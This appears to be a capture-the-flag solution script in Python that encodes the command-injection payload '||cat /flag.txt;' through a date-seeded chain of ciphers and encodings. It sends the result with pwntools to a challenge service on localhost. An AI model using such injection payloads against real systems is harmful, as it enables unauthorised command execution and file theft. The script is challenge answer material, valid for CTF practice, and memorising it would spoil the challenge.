#!/usr/bin/env python3
import argparse
import base64
import hashlib
from datetime import date
from typing import Callable

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from pwn import remote


def __thirsty_leakey(i: bytes) -> bytes:
    # xor
    key = b"awesome_easley"
    return bytes([i[j] ^ key[j % len(key)] for j in range(len(i))])


def __frosty_shannon(i: bytes) -> bytes:
    # rot13
    return i.translate(
        bytes.maketrans(
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            b"NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
        )
    )


def __flamboyant_shannon(i: bytes) -> bytes:
    # b64 encode
    return base64.b64encode(i)


def __elated_liskov(i: bytes) -> bytes:
    # AES encrypt
    iv = b"practical_bhabha"
    key = b"gracious_jackson"

    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(i, AES.block_size))


def __fervent_ramanujan(i: bytes) -> bytes:
    # hex encode
    return i.hex().encode()


def __pensive_engelbart(i: bytes) -> bytes:
    # add 51 mod 256
    return bytes([(b + 51) % 256 for b in i])


def __youthful_dhawan(i: bytes) -> bytes:
    # reverse
    return i[::-1]


def __diligent_tesla(i: bytes) -> bytes:
    # caesar cipher -5
    result = bytearray()
    for b in i:
        if ord("a") <= b <= ord("z"):  # a-z
            result.append(((b - ord("a") + 5) % 26) + ord("a"))
        elif ord("A") <= b <= ord("Z"):  # A-Z
            result.append(((b - ord("A") + 5) % 26) + ord("A"))
        else:
            result.append(b)
    return bytes(result)


def __clever_turing(i: bytes) -> bytes:
    # nibble swap
    return bytes([(b >> 4) | ((b & 0x0F) << 4) for b in i])


def __interesting_agnesi(i: bytes) -> bytes:
    # no op
    return i


def __zealous_visvesvaraya(i: bytes) -> bytes:
    # bitwise NOT
    return bytes([~b & 0xFF for b in i])


def __gifted_brahmagupta(i: bytes) -> bytes:
    return bytes([~b & 0xFF if idx % 2 == 1 else b for idx, b in enumerate(i)])


def __malicious_einstein(i: int) -> list[int]:
    today = date.today()
    seed = b"thirsty_murdock"
    length = today.timetuple().tm_mday % 10 + 15

    out = []
    ctr = 0
    while len(out) < length:
        h = hashlib.sha256(seed + ctr.to_bytes(4, "little")).digest()
        for b in h:
            out.append(b % i)
            if len(out) == length:
                break
        ctr += 1
    return out


FUNCTIONS: list[Callable[[bytes], bytes]] = [
    __fervent_ramanujan,
    __diligent_tesla,
    __elated_liskov,
    __clever_turing,
    __thirsty_leakey,
    __interesting_agnesi,
    __gifted_brahmagupta,
    __frosty_shannon,
    __pensive_engelbart,
    __youthful_dhawan,
    __fervent_ramanujan,
    __zealous_visvesvaraya,
    __flamboyant_shannon,
]


def generate_payload() -> bytes:
    target_string = b"||cat /flag.txt;"

    ord = __malicious_einstein(len(FUNCTIONS))

    wip = __flamboyant_shannon(target_string)
    wip = __zealous_visvesvaraya(wip)
    wip = __fervent_ramanujan(wip)
    wip = __youthful_dhawan(wip)
    wip = __pensive_engelbart(wip)
    wip = __frosty_shannon(wip)
    for i, idx in enumerate(reversed(ord)):
        print(f"Applying function {i}/{len(ord)}: {FUNCTIONS[idx].__name__}")
        wip = FUNCTIONS[idx](wip)
    wip = __gifted_brahmagupta(wip)
    wip = __interesting_agnesi(wip)
    wip = __thirsty_leakey(wip)
    wip = __clever_turing(wip)
    wip = __elated_liskov(wip)
    wip = __diligent_tesla(wip)
    wip = __fervent_ramanujan(wip)
    return wip


def main() -> None:

    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=27381)
    args = parser.parse_args()
    payload = generate_payload()

    with remote(args.host, args.port) as conn:
        conn.sendline(payload)
        response = conn.recvall(timeout=1)
        print(response.decode(errors="ignore"), end="")


if __name__ == "__main__":
    main()
